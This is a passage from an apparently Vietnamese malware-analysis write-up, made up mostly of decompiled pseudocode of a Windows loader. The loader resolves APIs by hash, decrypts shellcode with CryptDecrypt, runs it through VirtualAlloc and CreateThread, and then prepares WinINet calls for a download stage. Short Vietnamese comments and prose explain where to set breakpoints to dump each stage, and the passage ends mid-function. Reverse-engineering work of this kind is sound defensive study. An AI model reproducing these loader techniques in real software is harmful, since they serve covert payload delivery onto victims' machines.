  void (__cdecl *v167)(_DWORD, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // [esp+1A4h] [ebp-108h]
  int (__cdecl *v168)(char *, int, signed int); // [esp+1A8h] [ebp-104h]
  void (__cdecl *v169)(int); // [esp+1ACh] [ebp-100h]
  char v170; // [esp+1B0h] [ebp-FCh]
  int (__stdcall *v171)(int *, _DWORD, _DWORD, signed int, signed int); // [esp+1B4h] [ebp-F8h]
  int (__stdcall *v172)(int, signed int, _DWORD, _DWORD, int *); // [esp+1B8h] [ebp-F4h]
  int (__stdcall *v173)(int, unsigned int, unsigned int, _DWORD); // [esp+1BCh] [ebp-F0h]
  int (__stdcall *v174)(int, signed int, int, _DWORD, int *); // [esp+1C0h] [ebp-ECh]
  int (__stdcall *v175)(int, _DWORD, int, _DWORD, int, char ***); // [esp+1C4h] [ebp-E8h]
  void (__stdcall *v176)(int); // [esp+1C8h] [ebp-E4h]
  void (__stdcall *v177)(int); // [esp+1CCh] [ebp-E0h]
  void (__stdcall *v178)(int, _DWORD); // [esp+1D0h] [ebp-DCh]
  int (__stdcall *v179)(int, signed int, char *, int *, _DWORD); // [esp+1D4h] [ebp-D8h]
  char v180; // [esp+1D8h] [ebp-D4h]
  int (__stdcall *v181)(int, int *); // [esp+1DCh] [ebp-D0h]
  int v182; // [esp+1E4h] [ebp-C8h]
  int v183; // [esp+1E8h] [ebp-C4h]
  int v184; // [esp+1ECh] [ebp-C0h]
  int v185; // [esp+1F0h] [ebp-BCh]
  int v186; // [esp+1F4h] [ebp-B8h]
  void *v187; // [esp+1F8h] [ebp-B4h]
  int v188; // [esp+1FCh] [ebp-B0h]
  int v189; // [esp+200h] [ebp-ACh]
  int v190; // [esp+204h] [ebp-A8h]
  int v191; // [esp+208h] [ebp-A4h]
  int v192; // [esp+20Ch] [ebp-A0h]
  int v193; // [esp+210h] [ebp-9Ch]
  int v194; // [esp+214h] [ebp-98h]
  int v195; // [esp+218h] [ebp-94h]
  int v196; // [esp+21Ch] [ebp-90h]
  int v197; // [esp+220h] [ebp-8Ch]
  int v198; // [esp+224h] [ebp-88h]
  int v199; // [esp+228h] [ebp-84h]
  int v200; // [esp+22Ch] [ebp-80h]
  int v201; // [esp+230h] [ebp-7Ch]
  int v202; // [esp+234h] [ebp-78h]
  int v203; // [esp+238h] [ebp-74h]
  int v204; // [esp+23Ch] [ebp-70h]
  int v205; // [esp+240h] [ebp-6Ch]
  int v206; // [esp+244h] [ebp-68h]
  int v207; // [esp+248h] [ebp-64h]
  int *v208; // [esp+24Ch] [ebp-60h]
  __int16 v209; // [esp+250h] [ebp-5Ch]
  int *v210; // [esp+254h] [ebp-58h]
  char *v211; // [esp+258h] [ebp-54h]
  int *v212; // [esp+25Ch] [ebp-50h]
  __int16 v213; // [esp+260h] [ebp-4Ch]
  int *v214; // [esp+264h] [ebp-48h]
  char *v215; // [esp+268h] [ebp-44h]
  int *v216; // [esp+26Ch] [ebp-40h]
  __int16 v217; // [esp+270h] [ebp-3Ch]
  int *v218; // [esp+274h] [ebp-38h]
  char *v219; // [esp+278h] [ebp-34h]
  int *v220; // [esp+27Ch] [ebp-30h]
  __int16 v221; // [esp+280h] [ebp-2Ch]
  int *v222; // [esp+284h] [ebp-28h]
  char *v223; // [esp+288h] [ebp-24h]
  char v224; // [esp+28Ch] [ebp-20h]

  v1 = *(_DWORD *)(__readfsdword(0x18u) + 48);
  v146 = 6619243;
  v147 = 7209074;
  v148 = 7077989;
  v2 = *(_DWORD *)(v1 + 12);
  v149 = 3276851;
  v150 = 6553646;
  v151 = 7077996;
  v118 = *(_DWORD *)(v2 + 20);
  v3 = (_DWORD *)v118;
  v152 = 0;
  while ( 1 )
  {
    v4 = (unsigned __int16 *)v3[10];
    v5 = &v146;
    v6 = *v4;
    if ( *v4 )
    {
      while ( *(_WORD *)v5 )
      {
        v7 = *(_WORD *)v5 | 0x20;
        v8 = v6 | 0x20;
        result = v7;
        if ( (_WORD)v8 != v7 )
        {
          v10 = v8;
          goto LABEL_7;
        }
        v6 = v4[1];
        ++v4;
        v5 = (int *)((char *)v5 + 2);
        if ( !v6 )
          break;
      }
    }
    v10 = *v4 | 0x20;
    result = *(unsigned __int16 *)v5 | 0x20;
LABEL_7:
    if ( v10 == result )
      break;
    v3 = (_DWORD *)*v3;
    if ( v3 == (_DWORD *)v118 || !v3[6] )
      return result;
  }
  v11 = v3[4];
  v112 = (char **)v11;
  if ( !v11 )
    return result;
  v12 = *(_DWORD *)(v11 + 60);
  v113 = 0;
  v13 = *(_DWORD *)(v12 + v11 + 120);
  if ( !v13 )
    goto LABEL_23;
  if ( (unsigned int)(v13 + *(_DWORD *)(v12 + v11 + 124)) >= *(_DWORD *)(v12 + v11 + 80) )
    goto LABEL_23;
  v14 = *(_DWORD *)(v13 + v11 + 24);
  v15 = v11 + *(_DWORD *)(v13 + v11 + 32);
  v120 = v11 + *(_DWORD *)(v13 + v11 + 36);
  v16 = v11 + *(_DWORD *)(v13 + v11 + 28);
  v113 = 0;
  v119 = v16;
  v17 = 0;
  v118 = v15;
  v121 = v14;
  v103 = 0;
  if ( !v14 )
    goto LABEL_23;
  while ( 1 )
  {
    v18 = 0;
    v19 = (_BYTE *)(v11 + *(_DWORD *)(v15 + 4 * v17));
    v20 = 0;
    if ( *v19 )
      break;
LABEL_20:
    v103 = ++v17;
    if ( v17 >= v121 )
      goto LABEL_23;
  }
  do
  {
    v21 = (char)v19[v20] % 16;
    v22 = v20 + (char)v19[v20] / 16;
    ++v20;
    v18 = 16 * v21 + v22 + 3 * v18;
  }
  while ( v19[v20] );
  v17 = v103;
  if ( v18 != 50823829 )
  {
    v11 = (int)v112;
    v15 = v118;
    goto LABEL_20;
  }
  v113 = (unsigned int)v112 + *(_DWORD *)(v119 + 4 * *(unsigned __int16 *)(v120 + 2 * v103));
LABEL_23:
  v126 = 1852990827;
  v208 = &v126;
  v23 = (unsigned int *)&v211;
  v127 = 842230885;
  v209 = 7;
  v24 = 4;
  v128 = 1819042862;
  v210 = &v182;
  v211 = &v154;
  v212 = &v123;
  v213 = 10;
  v214 = &v198;
  v215 = &v159;
  v216 = &v130;
  v217 = 9;
  v218 = &v189;
  v219 = &v170;
  v220 = &v134;
  v221 = 1;
  v222 = &v153;
  v129 = 0;
  v182 = 247252859;
  v183 = 50823829;
  v184 = 28379480;
  v185 = 13732044;
  v186 = 1016389420;
  v187 = &unk_905946;
  v188 = 10736;
  v123 = 1668707181;
  v124 = 1680766066;
  LOWORD(v125) = 27756;
  BYTE2(v125) = 0;
  v198 = 39303;
  v199 = 23003;
  v200 = 22618;
  v201 = 21006;
  v202 = 65583;
  v203 = 65749;
  v204 = 61883;
  v205 = 51933;
  v206 = 66060;
  v207 = 3467;
  v130 = 1635148897;
  v131 = 842230128;
  v132 = 1819042862;
  v133 = 0;
  v189 = -1325356753;
  v190 = 401672098;
  v191 = 44793460;
  v192 = 134098568;
  v193 = 14898094;
  v194 = 402270546;
  v195 = 1206809627;
  v196 = -1800804564;
  v197 = -665511296;
  v134 = 1818783849;
  v135 = 1768972656;
  v136 = 1819042862;
  LOBYTE(v137) = 0;
  v153 = 741649556;
  v223 = &v180;
  v112 = &v211;
  v116 = (const char *)4;
  do
  {
    v25 = *(v23 - 3);
    v142 = *v23;
    v26 = (int *)v142;
    *v26 = ((int (__stdcall *)(int))v113)(v25);
    v27 = *((unsigned __int16 *)v23 - 4);
    v28 = 0;
    v101 = v27;
    v104 = 0;
    if ( v27 )
    {
      v107 = (int)(v26 + 1);
      do
      {
        v29 = *v26;
        v30 = 0;
        v118 = v29;
        v31 = *(_DWORD *)(v29 + 60);
        v32 = *(_DWORD *)(v31 + v29 + 120);
        if ( v32 && (unsigned int)(v32 + *(_DWORD *)(v31 + v29 + 124)) < *(_DWORD *)(v31 + v29 + 80) )
        {
          v33 = 0;
          v34 = v29 + *(_DWORD *)(v32 + v29 + 36);
          v115 = 0;
          v35 = *(_DWORD *)(v32 + v29 + 32);
          v114 = v34;
          v36 = v29 + v35;
          v37 = v29 + *(_DWORD *)(v32 + v29 + 28);
          v119 = v36;
          v109 = v37;
          v120 = *(_DWORD *)(v32 + v29 + 24);
          v117 = 0;
          if ( v120 )
          {
            v38 = *(_DWORD *)&(*(v112 - 1))[4 * v28];
            v121 = *(_DWORD *)&(*(v112 - 1))[4 * v28];
            while ( 1 )
            {
              v39 = 0;
              v40 = (_BYTE *)(v29 + *(_DWORD *)(v36 + 4 * v33));
              v41 = 0;
              if ( *v40 )
              {
                do
                {
                  v42 = (char)v40[v41] % 16;
                  v43 = v41 + (char)v40[v41] / 16;
                  ++v41;
                  v39 = 16 * v42 + v43 + 3 * v39;
                }
                while ( v40[v41] );
                v33 = (unsigned int)v117;
                v29 = v118;
                v38 = v121;
              }
              if ( v39 == v38 )
                break;
              v36 = v119;
              v117 = (const char *)++v33;
              if ( v33 >= v120 )
              {
                v28 = v104;
                v30 = v115;
                goto LABEL_38;
              }
            }
            v28 = v104;
            v30 = v29 + *(_DWORD *)(v109 + 4 * *(unsigned __int16 *)(v114 + 2 * v33));
          }
          else
          {
            v30 = 0;
          }
        }
LABEL_38:
        v26 = (int *)v142;
        *(_DWORD *)(v107 + 4 * v28++) = v30;
        v104 = v28;
      }
      while ( v28 < v101 );
      v24 = (signed int)v116;
    }
    v23 = (unsigned int *)(v112 + 4);
    --v24;
    v112 += 4;
    v116 = (const char *)v24;
  }
  while ( v24 );
  v44 = (_BYTE *)a1;
  v45 = 0;
  v46 = 0;
  v47 = *(_DWORD *)(a1 + 91);
  if ( *(_BYTE *)(a1 + 53) == 49 )
  {
    v45 = (const char *)v160(a1);
    v47 += v162(v45);
    v44 = (_BYTE *)a1;
  }
  if ( v44[54] == 49 )
  {
    v46 = (const char *)v160((int)(v44 + 9));
    v47 += v162(v46);
    v44 = (_BYTE *)a1;
  }
  v48 = v47 + 15;
  if ( v44[55] != 49 )
    v48 = v47;
  v49 = v48 + 17;
  if ( v44[56] != 49 )
    v49 = v48;
  v116 = (const char *)v161(v49, 1);//msvcrt_calloc
  result = v161(v49, 1);//msvcrt_calloc
  v117 = (const char *)result;
  if ( v116 && result )
  {
    v50 = a1;
    if ( *(_DWORD *)(a1 + 91) )
    {
      v51 = ((int (__cdecl *)(const char *, int))v162)(v116, a1 + 103);//msvcrt_strlen
      v163((int)&v116[v51]);
    }
    if ( *(_BYTE *)(a1 + 53) == 49 )
    {
      v52 = 0;
      if ( strlen(v45) )
      {
        do
        {
          v53 = v45[v52];
          if ( (unsigned __int8)(v53 - 65) <= 0x19u )
            v45[v52] = v53 + 32;
          ++v52;
        }
        while ( v52 < strlen(v45) );
      }
      v54 = (int)v116;
      v55 = v162(v116);
      v163((int)&v116[v55]);
      v50 = a1;
    }
    else
    {
      v54 = (int)v116;
    }
    if ( *(_BYTE *)(v50 + 54) == 49 )
    {
      v56 = 0;
      if ( strlen(v46) )
      {
        do
        {
          v57 = v46[v56];
          if ( (unsigned __int8)(v57 - 65) <= 0x19u )
            v46[v56] = v57 + 32;
          ++v56;
        }
        while ( v56 < strlen(v46) );
      }
      v58 = v162((const char *)v54);
      v163(v54 + v58);
    }
    v138 = 4;
    v59 = v166(648);//msvcrt_malloc
    v105 = v59;
    if ( v181(v59, &v138) == 111 )//iphlpapi_GetAdaptersInfo
    {
      v105 = v166(v138);//msvcrt_malloc
      v59 = v105;
    }
    v60 = v181(v59, &v138);//iphlpapi_GetAdaptersInfo
    v61 = 0;
    v113 = v60;
    v110 = 0;
    if ( !v60 )
    {
      v62 = (_DWORD *)v59;
      if ( v59 )
      {
        do
        {
          v62 = (_DWORD *)*v62;
          ++v61;
        }
        while ( v62 );
        v110 = v61;
      }
    }
    v63 = a1;
    v114 = 0;
    v115 = 0;
    if ( *(_BYTE *)(a1 + 55) == 49 )
    {
      v114 = v161(16 * v61, 1);
      v61 = v110;
      v64 = 0;
      if ( v110 > 0 )
      {
        v65 = v114;
        do
        {
          *(_DWORD *)(v65 + 4 * v64) = v161(16, 1);
          v61 = v110;
          ++v64;
        }
        while ( v64 < v110 );
        v60 = v113;
      }
      v63 = a1;
    }
    if ( *(_BYTE *)(v63 + 56) == 49 )
    {
      v66 = v161(18 * v61, 1);
      v67 = 0;
      v68 = v66;
      v115 = v66;
      if ( v110 <= 0 )
      {
        v63 = a1;
      }
      else
      {
        v69 = v66;
        do
          *(_DWORD *)(v69 + 4 * v67++) = v161(18, 1);
        while ( v67 < v110 );
        v59 = v105;
        v60 = v113;
        v63 = a1;
        v68 = v115;
      }
    }
    else
    {
      v68 = 0;
    }
    if ( !v60 && v59 )
    {
      v70 = v114;
      v71 = (_DWORD *)v68;
      v72 = v114 - v68;
      do
      {
        if ( v70 )
          *(_DWORD *)((char *)v71 + v72) = v59 + 432;
        if ( v68 )
        {
          v167(
            *v71,
            v63 + 22,
            *(unsigned __int8 *)(v59 + 404),
            *(unsigned __int8 *)(v59 + 405),
            *(unsigned __int8 *)(v59 + 406),
            *(unsigned __int8 *)(v59 + 407),
            *(unsigned __int8 *)(v59 + 408),
            *(unsigned __int8 *)(v59 + 409));
          v68 = v115;
        }
        v59 = *(_DWORD *)v59;
        ++v71;
        v63 = a1;
        v70 = v114;
      }
      while ( v59 );
    }
    v73 = a1;
    v74 = *(_BYTE *)(a1 + 52);
    if ( v74 )
    {
      switch ( v74 )
      {
        case 1:
          v108 = 26127;
          v75 = 16;
          break;
        case 2:
          v108 = 26128;
          v75 = 16;
          break;
        case 3:
          v108 = 26114;
          v75 = 8;
          break;
        case 4:
          v108 = 26625;
          v75 = 8;
          break;
        case 5:
          v108 = 26113;
          v75 = 8;
          break;
        case 6:
          v108 = 26115;
          v75 = 8;
          break;
        case 7:
          v108 = 26121;
          v75 = 8;
          break;
        default:
          v75 = v143;
          v108 = v143;
          break;
      }
    }
    else
    {
      v108 = 26126;
      v75 = 16;
    }
    v76 = v110;
    v77 = v110;
    v102 = v75;
    if ( *(_BYTE *)(a1 + 55) != 49 )
      v77 = 1;
    v121 = 0;
    v78 = *(_BYTE *)(a1 + 56) == 49;
    v143 = v77;
    if ( !v78 )
      v76 = 1;
    v79 = 0;
    v111 = v76;
    v106 = 0;
    if ( v77 )
    {
      do
      {
        v113 = 0;
        if ( v76 )
        {
          v80 = v117;
          do
          {
            ((void (__cdecl *)(const char *, const char *))v163)(v80, v116);//msvcrt__mbscpy
            if ( *(_BYTE *)(v73 + 55) == 49 )
            {
              v81 = 0;
              v82 = *(const char **)(v114 + 4 * v106);
              if ( strlen(*(const char **)(v114 + 4 * v106)) )
              {
                do
                {
                  v83 = v82[v81];
                  if ( (unsigned __int8)(v83 - 65) <= 0x19u )
                    v82[v81] = v83 + 32;
                  ++v81;
                }
                while ( v81 < strlen(v82) );
                v84 = *(_DWORD *)(v114 + 4 * v106);
              }
              v80 = v117;
              v85 = v162(v117);
              v163((int)&v80[v85]);
              v73 = a1;
            }
            if ( *(_BYTE *)(v73 + 56) == 49 )
            {
              v86 = 0;
              v87 = *(const char **)(v115 + 4 * v113);
              if ( strlen(*(const char **)(v115 + 4 * v113)) )
              {
                do
                {
                  v88 = v87[v86];
                  if ( (unsigned __int8)(v88 - 65) <= 0x19u )
                    v87[v86] = v88 + 32;
                  ++v86;
                }
                while ( v86 < strlen(v87) );
                v89 = *(_DWORD *)(v115 + 4 * v113);
              }
              v80 = v117;
              v90 = v162(v117);
              v163((int)&v80[v90]);
              v73 = a1;
            }
            v91 = v161(v75, 1);//msvcrt_calloc
            if ( v91 )
            {
              if ( v171(&v141, 0, 0, 24, -268435456) )//advapi32_CryptAcquireContextW
              {
                if ( v172(v141, 32780, 0, 0, &v140) )//advapi32_CryptCreateHash
                {
                  if ( v173(v140, (unsigned int)v80, strlen(v80), 0) && //advapi32_CryptHashData
                   v174(v141, v108, v140, 0, &v145) )//advapi32_CryptHashData
                  {
                    v92 = *(_DWORD *)(v73 + 99);
                    v93 = v92 / v102 + 1;
                    if ( !(v92 % v102) )
                      v93 = *(_DWORD *)(v73 + 99) / v102;
                    v142 = v93;
                    v118 = v102 * v93;
                    v120 = v155(0, v102 * v93, 12288, 64);//kernel32_VirtualAlloc
                    //v120 chính là vùng nhớ sẽ chứa shellcode
                    //cần đặt breakpoint ở sau hàm này để lấy địa chỉ vùng nhớ vừa cấp phát
                    //trước khi gọi hàm CreateThread, phải nhảy tới địa chỉ vùng nhớ này
                    //nhấn C để chuyển data sang code và đặt breakpoint
                    if ( v120 )
                    {
                      v94 = v102;
                      v95 = 0;
                      v119 = 0;
                      v112 = (char **)v102;
                      if ( v93 )
                      {
                        v96 = v93 - 1;
                        v97 = 0;
                        for ( i = v96; ; v96 = i )
                        {
                          if ( v95 == v96 )
                          {
                            v119 = 1;
                            v98 = *(_DWORD *)(a1 + 99);
                            if ( v98 < v118 )
                            {
                              v94 = v98 - v97;
                              v112 = (char **)(v98 - v97);
                            }
                          }
                          v164(v91, a1 + 103 + v97 + *(_DWORD *)(a1 + 91), v94);//msvcrt_memcpy
                          if ( !v175(v145, 0, v119, 0, v91, &v112) )//advapi32_CryptDecrypt
                            break;
                          v164(v97 + v120, v91, (int)v112);//msvcrt_memcpy
                          v165(v91, 0, v102);//msvcrt_memset
                          v97 += v102;
                          if ( ++v95 >= v142 )
                            break;
                          v94 = (int)v112;
                        }
                      }
                      if ( v121 || !v171(&v144, 0, 0, 24, -268435456) )//advapi32_CryptAcquireContextW
                      {
                        v73 = a1;
                      }
                      else
                      {
                        v73 = a1;
                        if ( v172(v144, 32780, 0, 0, &v139) )//advapi32_CryptCreateHash
                        {
                          v99 = v120;
                          if ( v173(v139, v120, *(_DWORD *)(a1 + 95), 0) )//advapi32_CryptHashData
                          {
                            i = 32;
                            if ( v179(v139, 2, &v224, &i, 0) )//advapi32_CryptGetHashParam
                            {
                              if ( v168(&v224, a1 + 58, 32) )//msvcrt_memcmp
                              {
                                v158(v99, v118, 0x8000);
                              }
                              else
                              {
                                //tại đây, shellcode sẽ được thực thi ở Thread mới thông qua hàm CreateThread
                                //nhớ đặt breakpoint ở vùng nhớ cấp phát trước khi cho chạy qua 2 hàm bên dưới
                                v100 = v156(0, 0, v99, 0, 0, 0);//kernel32_CreateThread
                                v157(v100, -1);//kernel32_WaitForSingleObject
                                v121 = 1;
                              }
                            }
                          }
                          v177(v139);
                        }
                        v178(v144, 0);
                      }
                    }
                    v176(v145);
                    v80 = v117;
                  }
                  v177(v140);
                }
                v178(v141, 0);
              }
              v169(v91);
            }
            v75 = v102;
            ++v113;
          }
          while ( v113 < v111 );
          v76 = v111;
          v79 = v106;
          v77 = v143;
        }
        v75 = v102;
        v106 = ++v79;
      }
      while ( v79 < v77 );
    }
    v169((int)v116);
    v169((int)v117);
    if ( v114 )
      v169(v114);
    result = v115;
    if ( v115 )
      result = ((int (__cdecl *)(int))v169)(v115);
  }
  return result;
}
```

Lần này mã độc giải mã shellcode bằng các hàm Crypto có sẵn trong thư viện **advapi32.dll** để giải mã shellcode.

Tương tự như ở trên, chúng ta chỉ cần tìm các lệnh gọi hàm thông qua biến và đặt breakpoint tại đó (xem chi tiết ở comment) chúng ta sẽ thu được shellcode mới (các hàm đã được rename cho dễ đọc 😉😉😉).

```C++
int __stdcall sub_990016(int a1)
{
  int v1; // eax
  int v2; // eax
  _DWORD *v3; // ebx
  unsigned __int16 *v4; // edx
  int *v5; // esi
  unsigned __int16 v6; // ax
  unsigned __int16 v7; // cx
  int v8; // edi
  int result; // eax
  int v10; // ecx
  int v11; // ecx
  int v12; // edx
  int v13; // ebx
  int v14; // eax
  int v15; // edx
  int v16; // edx
  int v17; // eax
  unsigned int v18; // eax
  int v19; // esi
  _BYTE *v20; // ebx
  int v21; // edi
  int v22; // ecx
  int v23; // eax
  int *v24; // ebx
  signed int v25; // edi
  int v26; // ST38_4
  int *v27; // esi
  int v28; // edx
  int v29; // esi
  int v30; // ebx
  int v31; // ecx
  int v32; // edi
  int v33; // eax
  unsigned int v34; // edx
  int v35; // ecx
  int v36; // ecx
  int v37; // eax
  int v38; // eax
  int v39; // edi
  _BYTE *v40; // ebx
  int v41; // ecx
  int v42; // esi
  int v43; // eax
  int v44; // edi
  int v45; // eax
  int v46; // edi
  int v47; // esi
  void *v48; // ecx
  int v49; // eax
  int v50; // ebx
  int v51; // edi
  int v52; // esi
  unsigned int v53; // ecx
  void (*v54)(void); // esi
  char v55; // [esp+Ch] [ebp-65Ch]
  char v56; // [esp+214h] [ebp-454h]
  WCHAR *v57; // [esp+41Ch] [ebp-24Ch]
  int v58; // [esp+424h] [ebp-244h]
  int v59; // [esp+428h] [ebp-240h]
  WCHAR *v60; // [esp+42Ch] [ebp-23Ch]
  int v61; // [esp+430h] [ebp-238h]
  int v62; // [esp+434h] [ebp-234h]
  int *v63; // [esp+458h] [ebp-210h]
  __int16 v64; // [esp+45Ch] [ebp-20Ch]
  int *v65; // [esp+460h] [ebp-208h]
  char *v66; // [esp+464h] [ebp-204h]
  int *v67; // [esp+468h] [ebp-200h]
  __int16 v68; // [esp+46Ch] [ebp-1FCh]
  int *v69; // [esp+470h] [ebp-1F8h]
  char *v70; // [esp+474h] [ebp-1F4h]
  int *v71; // [esp+478h] [ebp-1F0h]
  __int16 v72; // [esp+47Ch] [ebp-1ECh]
  int *v73; // [esp+480h] [ebp-1E8h]
  char *v74; // [esp+484h] [ebp-1E4h]
  int v75; // [esp+488h] [ebp-1E0h]
  int v76; // [esp+48Ch] [ebp-1DCh]
  int v77; // [esp+490h] [ebp-1D8h]
  int v78; // [esp+494h] [ebp-1D4h]
  int v79; // [esp+498h] [ebp-1D0h]
  int v80; // [esp+49Ch] [ebp-1CCh]
  int v81; // [esp+4A0h] [ebp-1C8h]
  int v82; // [esp+4A4h] [ebp-1C4h]
  int v83; // [esp+4A8h] [ebp-1C0h]
  int v84; // [esp+4ACh] [ebp-1BCh]
  int v85; // [esp+4B0h] [ebp-1B8h]
  int v86; // [esp+4B4h] [ebp-1B4h]
  int v87; // [esp+4B8h] [ebp-1B0h]
  int v88; // [esp+4BCh] [ebp-1ACh]
  int v89; // [esp+4C0h] [ebp-1A8h]
  int v90; // [esp+4C4h] [ebp-1A4h]
  char v91; // [esp+4C8h] [ebp-1A0h]
  int (__stdcall *_kernel32_VirtualAlloc)(_DWORD, signed int, signed int, signed int); // [esp+4D0h] [ebp-198h]
  void (__stdcall *v93)(void (*)(void), signed int, signed int); // [esp+4D4h] [ebp-194h]
  char v94; // [esp+4D8h] [ebp-190h]
  int (__cdecl *_msvcrt_calloc)(signed int, signed int); // [esp+4DCh] [ebp-18Ch]
  void (__cdecl *_wininet_InternetCrackUrlW)(char *, _DWORD, signed int); // [esp+4E0h] [ebp-188h]
  int (__cdecl *v97)(int, int *); // [esp+4E4h] [ebp-184h]
  void (__cdecl *v98)(char *, int, int); // [esp+4E8h] [ebp-180h]
  int (__cdecl *v99)(int); // [esp+4ECh] [ebp-17Ch]
  void (__cdecl *v100)(char *, int, int); // [esp+4F0h] [ebp-178h]
  int (__cdecl *v101)(void (*)(void), int *, signed int); // [esp+4F4h] [ebp-174h]
  void (__cdecl *v102)(int); // [esp+4F8h] [ebp-170h]
  char v103; // [esp+4FCh] [ebp-16Ch]
  int (__stdcall *_wininet_InternetOpenW)(int *, _DWORD, _DWORD, _DWORD, _DWORD); // [esp+500h] [ebp-168h]
  int (__stdcall *v105)(char *, _DWORD, _DWORD, WCHAR **); // [esp+504h] [ebp-164h]
  int (__stdcall *_wininet_InternetConnectW)(int, WCHAR *, int, _DWORD, _DWORD, signed int, _DWORD, _DWORD); // [esp+508h] [ebp-160h]
  int (__stdcall *_wininet_HttpOpenRequestW)(int, WCHAR **, char *, _DWORD, _DWORD, int **, void *, _DWORD); // [esp+50Ch] [ebp-15Ch]
  int (__stdcall *_wininet_HttpSendRequestW)(int, _DWORD, _DWORD, _DWORD, _DWORD); // [esp+510h] [ebp-158h]
  int (__stdcall *_wininet_InternetQueryDataAvailable)(int, unsigned int *, _DWORD, _DWORD); // [esp+514h] [ebp-154h]
  int (__stdcall *v110)(int, int, unsigned int, int *); // [esp+518h] [ebp-150h]
  void (__stdcall *v111)(int); // [esp+51Ch] [ebp-14Ch]
  int v112; // [esp+524h] [ebp-144h]
  int v113; // [esp+528h] [ebp-140h]
  void *v114; // [esp+52Ch] [ebp-13Ch]
  int *v115; // [esp+530h] [ebp-138h]
  int v116; // [esp+534h] [ebp-134h]
  int v117; // [esp+538h] [ebp-130h]
  _DWORD *v118; // [esp+53Ch] [ebp-12Ch]
  int v119; // [esp+540h] [ebp-128h]
  int v120; // [esp+544h] [ebp-124h]
  int v121; // [esp+548h] [ebp-120h]
  int v122; // [esp+54Ch] [ebp-11Ch]
  int v123; // [esp+550h] [ebp-118h]
  int v124; // [esp+554h] [ebp-114h]
  int v125; // [esp+558h] [ebp-110h]
  int v126; // [esp+55Ch] [ebp-10Ch]
  int v127; // [esp+560h] [ebp-108h]
  int v128; // [esp+564h] [ebp-104h]
  int v129; // [esp+568h] [ebp-100h]
  int v130; // [esp+56Ch] [ebp-FCh]
  int v131; // [esp+570h] [ebp-F8h]
  int v132; // [esp+574h] [ebp-F4h]
  int v133; // [esp+578h] [ebp-F0h]
  int v134; // [esp+57Ch] [ebp-ECh]
  int v135; // [esp+580h] [ebp-E8h]
  int v136; // [esp+584h] [ebp-E4h]
  int v137; // [esp+588h] [ebp-E0h]
  int v138; // [esp+58Ch] [ebp-DCh]
  int v139; // [esp+590h] [ebp-D8h]
  int v140; // [esp+594h] [ebp-D4h]
  int v141; // [esp+598h] [ebp-D0h]
  int v142; // [esp+59Ch] [ebp-CCh]
  int v143; // [esp+5A0h] [ebp-C8h]
  void *v144; // [esp+5A4h] [ebp-C4h]
  int v145; // [esp+5A8h] [ebp-C0h]
  int v146; // [esp+5ACh] [ebp-BCh]
  int v147; // [esp+5B0h] [ebp-B8h]
  int v148; // [esp+5B4h] [ebp-B4h]
  int v149; // [esp+5B8h] [ebp-B0h]
  int v150; // [esp+5BCh] [ebp-ACh]
  int v151; // [esp+5C0h] [ebp-A8h]
  void *v152; // [esp+5C4h] [ebp-A4h]
  int v153; // [esp+5C8h] [ebp-A0h]
  int v154; // [esp+5CCh] [ebp-9Ch]
  int v155; // [esp+5D0h] [ebp-98h]
  int v156; // [esp+5D4h] [ebp-94h]
  int v157; // [esp+5D8h] [ebp-90h]
  int v158; // [esp+5DCh] [ebp-8Ch]
  int v159; // [esp+5E0h] [ebp-88h]
  int v160; // [esp+5E4h] [ebp-84h]
  int v161; // [esp+5E8h] [ebp-80h]
  __int16 v162; // [esp+5ECh] [ebp-7Ch]
  WCHAR *v163; // [esp+5F0h] [ebp-78h]
  int v164; // [esp+5F4h] [ebp-74h]
  int v165; // [esp+5F8h] [ebp-70h]
  int v166; // [esp+5FCh] [ebp-6Ch]
  int *v167; // [esp+604h] [ebp-64h]
  int v168; // [esp+608h] [ebp-60h]
  int v169; // [esp+60Ch] [ebp-5Ch]
  int v170; // [esp+610h] [ebp-58h]
  unsigned int v171; // [esp+614h] [ebp-54h]
  int (__stdcall *v172)(int); // [esp+618h] [ebp-50h]
  int v173; // [esp+61Ch] [ebp-4Ch]
  int v174; // [esp+620h] [ebp-48h]
  int v175; // [esp+624h] [ebp-44h]
  char v176; // [esp+628h] [ebp-40h]
  int v177; // [esp+62Ch] [ebp-3Ch]
  int v178; // [esp+630h] [ebp-38h]
  int v179; // [esp+634h] [ebp-34h]
  int v180; // [esp+638h] [ebp-30h]
  int v181; // [esp+63Ch] [ebp-2Ch]
  __int16 v182; // [esp+640h] [ebp-28h]
  char v183; // [esp+642h] [ebp-26h]
  int v184; // [esp+644h] [ebp-24h]
  __int16 v185; // [esp+648h] [ebp-20h]
  int v186; // [esp+64Ch] [ebp-1Ch]
  __int16 v187; // [esp+650h] [ebp-18h]
  int v188; // [esp+654h] [ebp-14h]
  int v189; // [esp+658h] [ebp-10h]
  _DWORD *v190; // [esp+65Ch] [ebp-Ch]
  int v191; // [esp+660h] [ebp-8h]
  int *v192; // [esp+664h] [ebp-4h]
  void (*v193)(void); // [esp+670h] [ebp+8h]

  v1 = *(_DWORD *)(__readfsdword(0x18u) + 48);
  v156 = 6619243;
  v157 = 7209074;
  v158 = 7077989;
  v2 = *(_DWORD *)(v1 + 12);
  v159 = 3276851;
  v160 = 6553646;
  v161 = 7077996;
  v3 = *(_DWORD **)(v2 + 20);
  v167 = *(int **)(v2 + 24);
  v190 = v3;
  v162 = 0;
  while ( 1 )
  {
    v4 = (unsigned __int16 *)v3[10];
    v5 = &v156;
    v6 = *v4;
    if ( *v4 )
    {
      while ( *(_WORD *)v5 )
      {
        v7 = *(_WORD *)v5 | 0x20;
        v8 = v6 | 0x20;
        result = v7;
        if ( (_WORD)v8 != v7 )
        {
          v10 = v8;
          goto LABEL_7;
        }
        v6 = v4[1];
        ++v4;
        v5 = (int *)((char *)v5 + 2);
        if ( !v6 )
          break;
      }
    }
    result = *(unsigned __int16 *)v5 | 0x20;
    v10 = *v4 | 0x20;
LABEL_7:
    if ( v10 == result )
      break;
    v3 = (_DWORD *)*v3;
    if ( v3 == v190 || !v3[6] )
      return result;
  }
  v11 = v3[4];
  v192 = (int *)v11;
  if ( !v11 )
    return result;
  v12 = *(_DWORD *)(v11 + 60);
  v172 = 0;
  v13 = *(_DWORD *)(v12 + v11 + 120);
  v14 = *(_DWORD *)(v12 + v11 + 124);
  v189 = v13;
  if ( !v13 )
    goto LABEL_23;
  if ( (unsigned int)(v13 + v14) >= *(_DWORD *)(v12 + v11 + 80) )
    goto LABEL_23;
  v15 = *(_DWORD *)(v13 + v11 + 32);
  v188 = v11 + *(_DWORD *)(v13 + v11 + 36);
